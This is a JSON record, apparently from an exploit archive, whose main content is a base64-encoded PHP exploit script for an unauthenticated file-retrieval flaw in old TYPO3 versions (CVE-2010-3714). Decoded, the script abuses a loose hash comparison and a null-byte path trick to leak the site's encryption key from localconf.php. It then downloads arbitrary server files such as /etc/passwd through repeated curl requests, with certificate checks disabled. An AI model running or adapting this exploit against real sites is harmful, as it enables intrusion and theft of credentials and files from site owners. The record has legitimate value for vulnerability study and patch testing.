{
    "source": "exploit-database", 
    "exploit": "PD9waHANCi8qIFRZUE8zLVNBLTIwMTAtMDIyLnBocA0KICogRXhwbG9pdCBUaXRsZTogVFlQTzMgVW5hdXRoZW50aWNhdGVkIEFyYml0cmFyeSBGaWxlIFJldHJpZXZhbCAoVFlQTzMtU0EtMjAxMC0wMjAsIFRZUE8zLVNBLTIwMTAtMDIyKQ0KICogRGF0ZTogMjkvMTIvMjAxMA0KICogQXV0aG9yOiBpa2tpDQogKiBTb2Z0d2FyZSBMaW5rOiBodHRwOi8vdHlwbzMub3JnL2Rvd25sb2FkLywgaHR0cDovL3NvdXJjZWZvcmdlLm5ldC9wcm9qZWN0cy90eXBvMy9maWxlcy8gDQogKiBWZXJzaW9uOiA0LjIuMTUsIDQuMy43IG9yIDQuNC40DQogKiBUZXN0ZWQgb246IHBocA0KICogQ1ZFIDogQ1ZFLTIwMTAtMzcxNCAobm9uLXR5cGVzYWZlIGNvbXBhcmlzb24gZmxhdyksIG4vYSAoZmlsZURlbnlQYXR0ZXJuIGJ5cGFzcykNCiAqIEEgZGVtb25zdHJhdGlvbiB2aWRlbyBmb3IgdGhpcyB2dWxuZXJhYmlsaXR5IGlzIGFsc28gYXZhaWxhYmxlIGhlcmU6IGh0dHA6Ly93d3cuaWtraXNvZnQuY29tL3N0dWZmL1RZUE8zLVNBLTIwMTAtMDIwX3ZpZGVvLmh0bQ0KICoNCiAqIEBfaWtraQ0KICogDQogKiBUWVBPMyBVbmF1dGhlbnRpY2F0ZWQgQXJiaXRyYXJ5IEZpbGUgUmV0cmlldmFsIChUWVBPMy1TQS0yMDEwLTAyMCwgcGx1cyBUWVBPMy1TQS0yMDEwLTAyMikNCiAqIA0KICogRXhwbG9pdGluZyBhIG5vbi10eXBlc2FmZSBjb21wYXJpc29uIGZsYXcsIGEgcmVtb3RlIGFnZ3Jlc3NvciBjYW4gYWNjZXNzIGFyYml0cmFyeSBmaWxlcw0KICogb24gYSB2dWxuZXJhYmxlIHN5c3RlbS4gQXV0aGVudGljYXRpb24gaXMgbm90IHJlcXVpcmVkIHRvIGV4cGxvaXQgdGhpcyB2dWxuZXJhYmlsaXR5Lg0KICogTW9yZW92ZXIsIGEgImZpbGVEZW55UGF0dGVybiIgYnlwYXNzIGhhcyBiZWVuIGltcGxlbWVudGVkIGluIG9yZGVyIHRvIHNwZWVkIHVwIHRoZSBhdHRhY2suIA0KICoNCiAqIFJlZmVyZW5jZXM6DQogKiAtIGh0dHA6Ly90eXBvMy5vcmcvdGVhbXMvc2VjdXJpdHkvc2VjdXJpdHktYnVsbGV0aW5zL3R5cG8zLXNhLTIwMTAtMDIwLw0KICogLSBodHRwOi8vYnVncy50eXBvMy5vcmcvdmlldy5waHA/aWQ9MTU4OTgNCiAqIC0gaHR0cDovL3BocC5uZXQvbWFudWFsL2VuL2xhbmd1YWdlLm9wZXJhdG9ycy5jb21wYXJpc29uLnBocA0KICogLSBodHRwOi8vYmxvZy5uaWJibGVzZWMub3JnLzIwMTAvMTIvdW5zcGVjaWZpZWQtdnVsbmVyYWJpbGl0aWVzLmh0bWwgKCJsZWFzdCBkaXNjbG9zdXJlIiByYW50KQ0KICoNCiAqIEZpeDogVXBkYXRlIHRvIHRoZSBUWVBPMyB2ZXJzaW9ucyA0LjIuMTYsIDQuMy45LCA0LjQuNSBvciBuZXdlcg0KICogQ3JlZGl0czogR3JlZ29yIEtvcGYgZm9yIGZpbmRpbmcgdGhlIG5lYXQgbm9uLXR5cGVzYWZlIGNvbXBhcmlzb24gZmxhdywgTWljaGHFgiBUcm9qbmFyYSBmb3IgaGlzIGRhaWx5IHRpcHMgDQogKi8NCg0KZGVmaW5lKCJWRVJTSU9OIiwiMC4yIik7DQovKiB2MC4yDQogKiAtIEhUVFAgYW5kIEhUVFBTIHN1cHBvcnQgKHdpdGhvdXQgdmVyaWZ5aW5nIHRoZSBwZWVyJ3MgY2VydGlmaWNhdGUpDQogKiAtIEZpbGUgcmV0cmlldmFsLCBqdXN0IGFmdGVyIHRoZSBpbml0aWFsIGVuY3J5cHRpb24ga2V5IGRpc2Nsb3N1cmUgDQogKiAtIFByb3h5IHN1cHBvcnQNCiAqIC0gKERpcnR5KSBtdWx0aSByZXF1ZXN0cyBzdXBwb3J0ICh1c2luZyBjdXJsIG11bHRpX3JlcXVlc3RzKQ0KICogLSBQcmVsaW1pbmFyeSBjaGVja3MgDQogKi8gDQpkZWZpbmUoIkRFQlVHIixGQUxTRSk7DQppZighZGVmaW5lZCgiU1RESU4iKSkgZGVmaW5lKCJTVERJTiIsIGZvcGVuKCdwaHA6Ly9zdGRpbicsJ3InKSk7DQppZighZGVmaW5lZCgiU1RERVJSIikpIGRlZmluZSgiU1RERVJSIiwgZm9wZW4oJ3BocDovL3N0ZGVycicsJ3InKSk7DQoNCi8qIFR1cm4gb24vb2ZmIGFsbCBlcnJvciByZXBvcnRpbmcgKi8NCkRFQlVHID8gZXJyb3JfcmVwb3J0aW5nKEVfQUxMKSA6IGVycm9yX3JlcG9ydGluZygwKTsgDQpzZXRfdGltZV9saW1pdCgwKTsNCg0KLyogTWFpbiAqLw0KZWNobygiXG5cbiA6OiBbIFRZUE8zLVNBLTIwMTAtMDIyLnBocCB2Ii5WRVJTSU9OLiIgXSA6OiBcblxuIik7DQoNCmlmKCRhcmdjPT0iMyIpew0KCSR0eXBvPSRhcmd2WzFdOw0KCSRyZXFzPSRhcmd2WzJdOyAvL1V3YWdhISBUb28gbWFueSByZXF1ZXN0cyBtYXkgZXZlbiBzbG93IGRvd24gdGhlIGF0dGFjaw0KfWVsc2UgaWYoJGFyZ2M9PSI0Iil7DQogCSR0eXBvPSRhcmd2WzFdOw0KIAkkcmVxcz0kYXJndlsyXTsgLy9Vd2FnYSEgVG9vIG1hbnkgcmVxdWVzdHMgbWF5IGV2ZW4gc2xvdyBkb3duIHRoZSBhdHRhY2sNCiAJJHByb3h5PSRhcmd2WzNdOw0KfWVsc2V7DQogCWVjaG8gIlVzYWdlOiBwaHAgIi4kYXJndlswXS4iIFRZUE8zVmFsaWRVUkwgUGFyYWxsZWxSZXF1ZXN0cyAoUHJveHkpXG5cbiI7DQogCWVjaG8gIkV4YW1wbGVzOlxyXG4iOw0KIAllY2hvICJwaHAgIi4kYXJndlswXS4iIGh0dHA6Ly8xMjcuMC4wLjEvaW5kZXgucGhwP2lkPTIgOVxuIjsNCiAJZWNobyAicGhwICIuJGFyZ3ZbMF0uIiBodHRwczovLzEyNy4wLjAuMS9pbmRleC5waHA/aWQ9MTUgOVxuIjsNCiAJZWNobyAicGhwICIuJGFyZ3ZbMF0uIiBodHRwOi8vMTI3LjAuMC4xOjgwODAvaW5kZXgucGhwP2lkPTIyMyAxMlxuIjsNCiAJZWNobyAicGhwICIuJGFyZ3ZbMF0uIiBodHRwOi8vMTI3LjAuMC4xL2luZGV4LnBocD9pZD0yMjMgMTIgaHR0cDovLzEyNy4wLjAuMTo4MTgxXG5cbiI7DQogCWV4aXQ7DQp9DQoNCiR1cmw9c3Vic3RyKCR0eXBvLDAsc3RycG9zKCR0eXBvLCJpZD0iKS0xKTsNCiRpZD1zdWJzdHIoJHR5cG8sc3RycG9zKCR0eXBvLCJpZD0iKSszKTsNCiRsb2NhdGlvbkRhdGE9JGlkLiI6IjsNCiRqdW1wdXJsPSJ0eXBvM2NvbmYvZXh0Ly4uL2xvY2FsY29uZi5waHAlMDAiOyAvL051bGwgYnl0ZSBhbmQgZGlyZWN0b3J5IG1vdmUgdXAgdHJpY2sgdGhlIGZpbGVEZW55UGF0dGVybiBtZWNoYW5pc20NCiRqdUhhc2g9IjAiOyAvLyAiMCIgaXMgYSBudW1lcmljIHN0cmluZywgY29udmVydGVkIGludGVybmFsbHkgdG8gMCAoaW50KSBieSBQSFAgZHVyaW5nIGNvbXBhcmlzb25zDQoNCi8qIFNURVAgMSAtIENoZWNrIHRoZSByZW1vdGUgVFlQTzMgaW5zdGFsbGF0aW9uICovDQokY2g9Y3VybF9pbml0KCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgRkFMU0UpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCBUUlVFKTsNCkRFQlVHID8gY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1ZFUkJPU0UsIFRSVUUpOmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9WRVJCT1NFLCBGQUxTRSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQppZihpc3NldCgkcHJveHkpKXsNCiAJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BST1hZLCAkcHJveHkpOw0KfQ0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsImlkPSIuJGlkLiImdHlwZT0wJmp1bXB1cmw9Ii4kanVtcHVybC4iJmp1U2VjdXJlPTEmbG9jYXRpb25EYXRhPSIuJGxvY2F0aW9uRGF0YS4iJmp1SGFzaD0iLiRqdUhhc2gpOw0KJG91dHB1dD1jdXJsX2V4ZWMoJGNoKTsNCg0KaWYoc3RyaXN0cigkb3V0cHV0LCJkaWQgbm90IG1hdGNoIikpIHsNCgllY2hvKCJbKl0gVFlQTzMgc3VjY2Vzc2Z1bGx5IGRldGVjdGVkIVxuIik7DQp9ZWxzZXsNCgllY2hvKCJbIV0gQSBwcm9ibGVtIG9jY3VycmVkIHdoaWxlIGRldGVjdGluZyB0aGUgcmVtb3RlIFRZUE8zIGluc3RhbGxhdGlvblxuIik7DQoJZXhpdDsNCn0NCmN1cmxfY2xvc2UgKCRjaCk7DQoNCi8qIFNURVAgMiAtIFJldHJpZXZlICRUWVBPM19DT05GX1ZBUlNbJ1NZUyddWydlbmNyeXB0aW9uS2V5J10gZnJvbSAvdHlwbzNjb25mL2xvY2FsY29uZi5waHAgKi8NCiRtaCA9IGN1cmxfbXVsdGlfaW5pdCgpOw0KJGhhbmRsZXMgPSBhcnJheSgpOw0KJGxvY2F0aW9uID0gJGxvY2F0aW9uRGF0YTsgLy9sb2NhdGlvbkRhdGEgd2l0aCBwYWRkaW5nDQoNCmZvcigkaT0wOyRpPCRyZXFzOyRpKyspew0KCQkkY2ggPSBjdXJsX2luaXQoKTsgLy9jcmVhdGUgYSBuZXcgc2luZ2xlIGN1cmwgaGFuZGxlDQogICAgCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KICAgIAljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIEZBTFNFKTsgDQogICAgCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgVFJVRSk7DQogICAgCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCiAgICAJaWYoaXNzZXQoJHByb3h5KSl7DQoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUFJPWFksICRwcm94eSk7DQogICAgCX0NCiAgICAJJGxvY2F0aW9uID0gIiUyMCIuJGxvY2F0aW9uOw0KICAgIAljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywiaWQ9Ii4kaWQuIiZ0eXBlPTAmanVtcHVybD0iLiRqdW1wdXJsLiImanVTZWN1cmU9MSZsb2NhdGlvbkRhdGE9Ii4kbG9jYXRpb24uIiZqdUhhc2g9Ii4kanVIYXNoKTsNCg0KICAgIAljdXJsX211bHRpX2FkZF9oYW5kbGUoJG1oLCRjaCk7DQogICAgCSRoYW5kbGVzW10gPSAkY2g7IC8vIHB1dCB0aGUgaGFuZGxlcyBpbiBhbiBhcnJheSB0byBsb29wDQp9DQoNCmVjaG8oIlsqXSBTdGFydGluZyBUWVBPMydzIGVuY3J5cHRpb24ga2V5IHJldHJpZXZhbFxuIik7DQplY2hvKCJbKl0gUGFkZGluZyBsb2NhdGlvbkRhdGEgdG8gZm9yY2UgJzBleHh4eHh4JyBzdHJpbmdzLiBJdCBtYXkgdGFrZSBhIHdoaWxlLiIpOw0KDQokcmNvbnQ9MDsNCndoaWxlKCFzdHJpc3RyKCRvdXRwdXQsIlRZUE8zX0NPTkZfVkFSU1snU1lTJ11bJ2VuY3J5cHRpb25LZXknXSIpKXsNCgkkcnVubmluZz1udWxsOw0KICAJZG97DQoJCWN1cmxfbXVsdGlfZXhlYygkbWgsJHJ1bm5pbmcpOw0KICAJfSB3aGlsZSAoJHJ1bm5pbmcgPiAwKTsNCg0KCWZvcigkaT0wOyRpPGNvdW50KCRoYW5kbGVzKTskaSsrKXsNCgkJJG91dHB1dCA9IGN1cmxfbXVsdGlfZ2V0Y29udGVudCgkaGFuZGxlc1skaV0pOw0KICAgIAkkbG9jYXRpb249IiUyMCIuJGxvY2F0aW9uOw0KICAgIAljdXJsX211bHRpX3JlbW92ZV9oYW5kbGUoJG1oLCRoYW5kbGVzWyRpXSk7DQogICAgCWN1cmxfc2V0b3B0KCRoYW5kbGVzWyRpXSwgQ1VSTE9QVF9QT1NURklFTERTLCJpZD0iLiRpZC4iJnR5cGU9MCZqdW1wdXJsPSIuJGp1bXB1cmwuIiZqdVNlY3VyZT0xJmxvY2F0aW9uRGF0YT0iLiRsb2NhdGlvbi4iJmp1SGFzaD0iLiRqdUhhc2gpOw0KICAgIAljdXJsX211bHRpX2FkZF9oYW5kbGUoJG1oLCRoYW5kbGVzWyRpXSk7DQoJCSRyY29udCsrOw0KICAgIAllY2hvKCIuIik7DQogIAl9DQp9DQoNCmN1cmxfbXVsdGlfcmVtb3ZlX2hhbmRsZSgkbWgsJGhhbmRsZXNbJGldKTsgDQpjdXJsX211bHRpX2Nsb3NlKCRtaCk7DQoNCiRrZXk9c3Vic3RyKCRvdXRwdXQsc3RycG9zKCRvdXRwdXQsIlRZUE8zX0NPTkZfVkFSU1snU1lTJ11bJ2VuY3J5cHRpb25LZXknXSA9ICciKSs0Myk7DQoka2V5PXN1YnN0cigka2V5LDAsc3RycG9zKCRrZXksIic7IikpOw0KZWNobygiXG5bKl0gRG9uZSEgIi4kcmNvbnQuIiByZXF1ZXN0c1xuIik7DQplY2hvKCJcblsqXSBUWVBPMydzIGVuY3J5cHRpb24ga2V5OiIuJGtleS4iXG4iKTsNCg0KLyogU1RFUCAzIC0gUmV0cmlldmUgYXJiaXRyYXJ5IGZpbGVzICovDQp3aGlsZSghMCkgew0KCWVjaG8oIlxuWypdIFdoaWNoIGZpbGUgZG8geW91IHdhbnQgdG8gZG93bmxvYWQ/XG4iKTsNCgllY2hvKCJbKl0gUGxlYXNlIG1ha2UgeW91ciBzZWxlY3Rpb24gKGUuZy4gJy9ldGMvcGFzc3dkJyk6XG5cbiIpOw0KCSRqdW1wdXJsPXRyaW0oZmdldHMoU1RESU4sMjU2KSk7DQoJLyogR2VuZXJhdGUgYSB2YWxpZCBoYXNoIGFzIGluIHRoZSBUWVBPMyBjb2RlYmFzZSovIAkNCgkkaEFycj0gYXJyYXkoJGp1bXB1cmwsJGxvY2F0aW9uRGF0YSwka2V5KTsNCgkkanVIYXNoPXN1YnN0cihtZDUoc2VyaWFsaXplKCRoQXJyKSksMCwxMCk7Ow0KDQoJJGNoPWN1cmxfaW5pdCgpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgRkFMU0UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgVFJVRSk7DQoJREVCVUcgPyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVkVSQk9TRSwgVFJVRSk6Y3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1ZFUkJPU0UsIEZBTFNFKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQogICAgaWYoaXNzZXQoJHByb3h5KSl7DQogCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUFJPWFksICRwcm94eSk7DQogICAgfQ0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCJpZD0iLiRpZC4iJnR5cGU9MCZqdW1wdXJsPSIuJGp1bXB1cmwuIiZqdVNlY3VyZT0xJmxvY2F0aW9uRGF0YT0iLiRsb2NhdGlvbkRhdGEuIiZqdUhhc2g9Ii4kanVIYXNoKTsNCgkkb3V0cHV0PWN1cmxfZXhlYygkY2gpOw0KDQoJZWNobygiXG5bKl0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIik7DQoJaWYoIXN0cmlzdHIoJG91dHB1dCwibm90IGEgdmFsaWQiKSkgZWNobyAkb3V0cHV0Ow0KCWVsc2UgZWNobygiWyFdIEFuIGVycm9yIG9jY3VycmVkIHdoaWxlIHJldHJpdmluZyAnIi4kanVtcHVybC4iJ1xuIik7DQoJZWNobygiXG5cblsqXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIik7DQoNCgljdXJsX2Nsb3NlICgkY2gpOw0KfQ==", 
    "filename": "platforms/php/webapps/15856.php", 
    "id": "15856", 
    "cves": [
        "CVE-2010-3714"
    ]
}